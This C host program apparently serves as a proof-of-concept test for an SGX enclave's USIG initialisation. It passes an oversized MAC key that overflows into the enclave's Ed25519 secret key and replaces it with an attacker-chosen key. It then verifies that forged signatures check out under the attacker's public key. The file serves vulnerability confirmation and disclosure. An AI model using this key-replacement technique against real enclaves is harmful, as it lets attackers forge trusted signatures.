/* Host for the USIG init-overflow consequence control.
 *
 * A hostile MAC key length is larger than the 1,024-byte usig_mac_key global.
 * In BASELINE the excess bytes reach edd25519_sk and replace the enclave's
 * Ed25519 secret key; this host then verifies the fresh signature with the
 * attacker public key and checks that the legitimate public key fails.
 *
 * The attacker source key's first byte is 0x01, not 0x00: the original
 * `edd25519_sk[edd25519_sk_len] = 0` store later forces it to 0x00.  The source
 * key therefore contains no NUL, so strncpy does not pad/truncate the overflow.
 * The public half matches the seed whose first byte is 0x00.  The 64-byte test
 * key was generated with the pinned crypto_sign_ed25519_keypair, retrying until
 * the seed began with 0x00 and the full seed||public half had no zero byte;
 * source seed[0] was then set to 0x01.  See README.md.
 *
 * This is a bounded consequence control, not a full exploit or a claim that
 * the host did not already choose the provisioned key. */
#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/evp.h>
#include <openssl/sha.h>
#include <sgx_urts.h>
#include "usig_enclave_u.h"

void ocall_print_string(const char *s) { if (s) fprintf(stderr, "USIG: %s\n", s); }

#define ATTACKER_KEY \
    "01d298e670b98dee793bceda50eef92347b2e9b62027209b3a83455558774673" \
    "93f39b887e8026f3e30f4bb0317247e873cc8b1822d8c4644f2db87fb10c7aad"
#define ATTACKER_PUB \
    "93f39b887e8026f3e30f4bb0317247e873cc8b1822d8c4644f2db87fb10c7aad"
#define LEGIT_PUB \
    "7454ba59d3570463e92f76e8a17a9f38d0c222c31b4a40a625aee1c46d94efb6"

static void unhex(uint8_t *d, const char *s)
{
    while (*s) {
        unsigned x;
        assert(sscanf(s, "%2x", &x) == 1);
        *d++ = (uint8_t)x;
        s += 2;
    }
}
static void le64(uint8_t *p, uint64_t x)
{
    for (unsigned i = 0; i < 8; i++) p[i] = (uint8_t)(x >> (8 * i));
}
static void le32(uint8_t *p, uint32_t x)
{
    for (unsigned i = 0; i < 4; i++) p[i] = (uint8_t)(x >> (8 * i));
}

__attribute__((noinline)) void usig_trace_ready(void)
{
    __asm__ volatile("" ::: "memory");
}

static int verify(const uint8_t pub[32], const uint8_t *digest, uint32_t id,
                  uint64_t ctr, const uint8_t *sig)
{
    uint8_t msg[44];
    le32(msg, id);
    le64(msg + 4, ctr);
    memcpy(msg + 12, digest, 32);
    EVP_PKEY *k = EVP_PKEY_new_raw_public_key(EVP_PKEY_ED25519, NULL, pub, 32);
    if (!k) return -1;
    EVP_MD_CTX *c = EVP_MD_CTX_new();
    int ok = EVP_DigestVerifyInit(c, NULL, NULL, NULL, k) == 1 &&
             EVP_DigestVerify(c, sig, 64, msg, sizeof msg) == 1;
    EVP_MD_CTX_free(c);
    EVP_PKEY_free(k);
    return ok;
}

int main(int argc, char **argv)
{
    assert(argc == 3);
    const char *image = argv[1];
    unsigned off = (unsigned)strtoul(argv[2], NULL, 0);
    /* usig_mac_key and edd25519_sk are separate globals/slots. */
    assert(off >= 1024 && off < 4096);

    sgx_enclave_id_t eid = 0;
    assert(sgx_create_enclave(image, SGX_DEBUG_FLAG, NULL, NULL, &eid, NULL) == SGX_SUCCESS);
    usig_trace_ready();

    uint8_t key[4096];
    memset(key, 0x4b, sizeof key);
    unhex(key + off, ATTACKER_KEY);
    uint8_t sk[64];
    memset(sk, 'S', sizeof sk);
    uint8_t apub[32], lpub[32];
    unhex(apub, ATTACKER_PUB);
    unhex(lpub, LEGIT_PUB);
    uint8_t digest[32];
    SHA256((const uint8_t *)"testmessage", 11, digest);
    sgx_ec256_private_t priv = {{1}};
    uint64_t ctr = 0;
    uint8_t sig[64];
    sgx_status_t app = 0xdead, t;

    t = ecall_usig_init(eid, &app, (char *)key, off + 64, priv, 3,
                        (char *)sk, 0);
    if (t != SGX_SUCCESS || app != SGX_SUCCESS) {
        fprintf(stderr, "INIT-FAIL transport=%x app=%x\n", t, app);
        return 1;
    }
    t = ecall_usig_create_ui_sig_edd25519(eid, &app, digest, 0, &ctr, sig, 64);
    if (t != SGX_SUCCESS || app != SGX_SUCCESS) {
        fprintf(stderr, "SIGN-FAIL transport=%x app=%x\n", t, app);
        return 1;
    }
    if (ctr != 1) {
        fprintf(stderr, "COUNTER %llu\n", (unsigned long long)ctr);
        return 1;
    }
    if (verify(apub, digest, 0, ctr, sig) != 1) {
        fprintf(stderr, "ATTACKER-VERIFY-FAIL\n");
        return 1;
    }
    if (verify(lpub, digest, 0, ctr, sig) == 1) {
        fprintf(stderr, "LEGIT-VERIFY-UNEXPECTED\n");
        return 1;
    }
    printf("KEY-REPLACE PASS offset=%u counter=%llu\n", off,
           (unsigned long long)ctr);
    assert(sgx_destroy_enclave(eid) == SGX_SUCCESS);
    return 0;
}
